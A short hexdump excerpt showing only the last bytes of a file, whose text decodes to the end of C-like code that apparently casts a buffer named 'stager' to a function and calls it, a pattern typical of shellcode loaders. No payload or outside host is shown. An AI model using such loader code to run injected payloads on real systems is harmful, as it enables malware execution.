000012e0  28 29 29 20 73 74 61 67  65 72 29 28 29 3b 0a 0a  |()) stager)();..|
000012f0  0a 0a 0a 0a 7d                                    |....}|
000012f5
